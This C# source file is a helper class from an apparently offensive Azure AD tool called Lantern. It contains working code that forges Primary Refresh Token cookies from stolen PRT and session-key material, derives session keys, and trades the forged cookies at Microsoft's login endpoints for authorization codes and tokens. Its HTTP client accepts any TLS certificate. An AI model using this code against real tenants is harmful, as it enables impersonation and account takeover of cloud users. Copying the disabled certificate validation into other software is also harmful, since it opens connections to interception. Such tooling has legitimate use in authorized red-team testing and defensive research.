﻿using JWT;
using JWT.Algorithms;
using JWT.Serializers;
using Lantern.Models;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;

namespace Lantern
{
    class Helper
    {
        public static string getCodeFromPRTCookie(string cookie, string proxy, string resourceID = "https://graph.windows.net", string clientID = "1b730954-1685-4b74-9bfd-dac224a7b894")
        {
            String uri = string.Format(@"/Common/oauth2/authorize?resource={0}&client_id={1}&response_type={2}&haschrome={3}&redirect_uri={4}&client-request-id={5}&x-client-SKU={6}&x-client-Ver={7}&x-client-CPU={8}&x-client-OS={9}&site_id={10}&mscrid={11}",
                resourceID,
                clientID,
                "code",
                "1",
                "urn:ietf:wg:oauth:2.0:oob",
                //Guid.NewGuid(),
                "AAAAAAA",
                "PCL.Desktop",
                "3.19.7.16602",
                "x64",
                "Microsoft Windows NT 10.0.19569.0",
                "501358",
                Guid.NewGuid());
            HttpClient client = getDefaultClient(proxy);
            using (client)
            {
                var message = new HttpRequestMessage(HttpMethod.Get, uri);
                String xcookie = "x-ms-RefreshTokenCredential=" + cookie;
                message.Headers.Add("Cookie", xcookie);
                var response = client.SendAsync(message).Result;
                if (response.StatusCode.Equals("200"))
                {
                    Console.WriteLine("[-] Something went wrong, cannot fetch code with PRT cookie, maybe Conditional Access Policy blocks.");
                    return null;
                }
                string location = "";
                if (response.Headers.Contains("Location"))
                {
                    location = response.Headers.Location.ToString();
                }
                else
                {
                    Console.WriteLine("[-] Something went wrong, cannot fetch code with PRT cookie, maybe Conditional Access Policy blocks.");
                    return "";
                }

                int startOf = location.IndexOf("code=");
                if (startOf == -1)
                {
                    Console.WriteLine("[-] Something went wrong, cannot fetch code with PRT cookie, maybe Conditional Access Policy blocks.");
                    return null;
                }
                int endOf = location.IndexOf("&", startOf + 5);
                int len = endOf - startOf;
                string code = location.Substring(startOf + 5, len - 5);
                client.Dispose();
                return code;
            }
        }

        public static HttpClient getDefaultClient(String proxy = null, bool useCookies = true, String baseAdress = "https://login.microsoftonline.com")
        {
            HttpClientHandler handler = new HttpClientHandler();
            if (proxy != null)
            {
                handler.Proxy = new WebProxy(proxy);
                handler.UseProxy = true;
            }

            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
            handler.ServerCertificateCustomValidationCallback =
                (httpRequestMessage, cert, cetChain, policyErrors) =>
                {
                    return true;
                };
            handler.AllowAutoRedirect = false;

            handler.UseCookies = useCookies;
            var client = new HttpClient(handler);
            client.BaseAddress = new Uri(baseAdress);
            client.DefaultRequestHeaders.Clear();
            //client.DefaultRequestHeaders.Add("UA-CPU", "AMD64");
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)");
            return client;

        }

        // https://stackoverflow.com/questions/1459006/is-there-a-c-sharp-equivalent-to-pythons-unhexlify
        public static byte[] Hex2Binary(string hex)
        {
            var chars = hex.ToCharArray();
            var bytes = new List<byte>();
            for (int index = 0; index < chars.Length; index += 2)
            {
                var chunk = new string(chars, index, 2);
                bytes.Add(byte.Parse(chunk, NumberStyles.AllowHexSpecifier));
            }
            return bytes.ToArray();
        }

        //https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        public static string Binary2Hex(byte[] ba)
        {
            return BitConverter.ToString(ba).Replace("-", "");
        }

        //https://stackoverflow.com/questions/1228701/code-for-decoding-encoding-a-modified-base64-url
        public static byte[] Base64Decode(string arg)
        {
            string s = arg;
            s = s.Replace('-', '+'); // 62nd char of encoding
            s = s.Replace('_', '/'); // 63rd char of encoding
            switch (s.Length % 4) // Pad with trailing '='s
            {
                case 0: break; // No pad chars in this case
                case 2: s += "=="; break; // Two pad chars
                case 3: s += "="; break; // One pad char
                default:
                    throw new System.Exception(
             "Illegal base64prt string!");
            }
            return Convert.FromBase64String(s); // Standard base64 decoder
        }

        public static string Base64UrlEncode(byte[] arg)
        {
            string s = Convert.ToBase64String(arg); // Regular base64 encoder
            s = s.Split('=')[0]; // Remove any trailing '='s
            s = s.Replace('+', '-'); // 62nd char of encoding
            s = s.Replace('/', '_'); // 63rd char of encoding
            return s;
        }

        public static string createPRTCookie(string prt, string context, string derived_sessionkey, string proxy, byte[] contextBytes = null, byte[] sessionKeyBytes = null)
        {
            
            string nonce = getNonce(proxy);

            byte[] data = Base64Decode(prt);

            string prtdecoded = Encoding.UTF8.GetString(data);

            var payload = new Dictionary<string, object>
            {
                { "refresh_token", prtdecoded },
                { "is_primary", "true" },
                { "request_nonce", nonce }
            };

            Dictionary<string, object> header = null;
            if (context != null)
            {
                header = new Dictionary<string, object>
                {
                    { "ctx", Hex2Binary(context) }
                };
            }
            else
            {
                header = new Dictionary<string, object>
                {
                    { "ctx", contextBytes }
                };
            }
            IJwtAlgorithm algorithm = new HMACSHA256Algorithm(); // symmetric
            IJsonSerializer serializer = new JsonNetSerializer();
            IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();
            IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);

            byte[] sdata = null;
            if (derived_sessionkey != null)
            {
                string secret = derived_sessionkey.Replace(" ", "");
                sdata = Hex2Binary(secret);
            } else
            {
                sdata = sessionKeyBytes;
            }
            var cookie = encoder.Encode(header, payload, sdata);
            return cookie;
        }

        public static string signJWT(Dictionary<string, object> header, Dictionary<string, object> payload, string key)
        {
            IJwtAlgorithm algorithm = new HMACSHA256Algorithm(); // symmetric
            IJsonSerializer serializer = new JsonNetSerializer();
            IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();
            IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);
            string secret = key.Replace(" ", "");
            byte[] sdata = Hex2Binary(secret);
            return encoder.Encode(header, payload, sdata); 
        }

        public static String getNonce(string proxy)
        {
            using (var client = getDefaultClient(proxy))
            {
                String uri = string.Format(@"/Common/oauth2/authorize?client_id={0}", "1b730954-1685-4b74-9bfd-dac224a7b894");
                var response = client.GetAsync(uri).Result;
                var responseContent = response.Content;
                string responseString = responseContent.ReadAsStringAsync().Result;
                int startOf = responseString.IndexOf("\"nonce\":\"");
                int endOf = responseString.IndexOf("\"", startOf + 9);
                int len = endOf - startOf;
                string nonce = responseString.Substring(startOf + 9, len - 9);
                client.Dispose();
                return nonce;
            }
        }

        private static string postTo(string uri, FormUrlEncodedContent formContent, string proxy)
        {
            using (var message = new HttpRequestMessage(HttpMethod.Post, uri))
            using (var client = Helper.getDefaultClient(proxy, false))
            {
                //message.Headers.Add("client-request-id", Guid.NewGuid().ToString());
                //message.Headers.Add("return-client-request-id", "true");
                message.Content = formContent;
                var response = client.SendAsync(message).Result;
                var result = response.Content.ReadAsStringAsync().Result;
                return result;
            }
        }

        public static string postToDeviceCodeEndpoint(FormUrlEncodedContent formContent, string proxy)
        {
            string uri = "/common/oauth2/devicecode";
            return postTo(uri, formContent, proxy);
        }

        public static string postToTokenEndpoint(FormUrlEncodedContent formContent, string proxy, string tenant = null)
        {
            string uri = "/common/oauth2/token";
            if (tenant != null)
            {
                uri = "/" + tenant + "/oauth2/token";
            }
            return postTo(uri, formContent, proxy);
        }

        public static string getNonce2(string proxy)
        {
            var formContent = new FormUrlEncodedContent(new[]
                {
                new KeyValuePair<string, string>("grant_type", "srv_challenge")
                });
            string result = postToTokenEndpoint(formContent, proxy);
            JToken parsedNonce = JToken.Parse(result);
            return parsedNonce["Nonce"].ToString();
        }

        public static string getTenantFromAccessToken(string accesstoken)
        {
            return getInfoFromBase64JSON(accesstoken, "tid");
        }

        public static string getAudienceFromAccessToken(string accesstoken)
        {
            return getInfoFromBase64JSON(accesstoken, "aud");
        }
        public static string getUPNFromAccessToken(string accesstoken)
        {
            return getInfoFromBase64JSON(accesstoken, "upn");
        }

        public static string getInfoFromBase64JSON(string jsonString, string info)
        {
            var serializer = new JsonNetSerializer();
            var urlEncoder = new JwtBase64UrlEncoder();
            var decoder = new JwtDecoder(serializer, urlEncoder);
            string decodedaccesstoken = decoder.Decode(jsonString);
            JToken parsedAccessToken = JToken.Parse(decodedaccesstoken);
            return parsedAccessToken[info].ToString();
        }

        public static byte[] GetByteArray(int size)
        {
            Random rnd = new Random();
            byte[] b = new byte[size]; // convert kb to byte
            rnd.NextBytes(b);
            return b;
        }

        public static byte[] combineByteArrays(byte[] first, byte[] second)
        {
            return first.Concat(second).ToArray();
        }

        public static byte[] createDerivedKey(byte[] sessionKey, byte[] context)
        {
            byte[] sessionKeyBytes = sessionKey;
            byte[] contextBytes = context;
            byte[] label = System.Text.Encoding.UTF8.GetBytes("AzureAD-SecureConversation");

            var first = new byte[]{ 0x00, 0x00, 0x00, 0x01 };
            var second = new byte[] { 0x00 };
            var third = new byte[] { 0x00, 0x00, 0x01, 0x00 };
            
            var value = combineByteArrays(first, label);
            value = combineByteArrays(value, second);
            value = combineByteArrays(value, contextBytes);
            value = combineByteArrays(value, third);

            var hmac = new System.Security.Cryptography.HMACSHA256(sessionKeyBytes);

            return hmac.ComputeHash(value);
        }

        public static byte[] ConvertToByteArray(string str, Encoding encoding)
        {
            return encoding.GetBytes(str);
        }

        public static String ToBinary(Byte[] data)
        {
            return string.Join(" ", data.Select(byt => Convert.ToString(byt, 2).PadLeft(8, '0')));
        }
    }
}
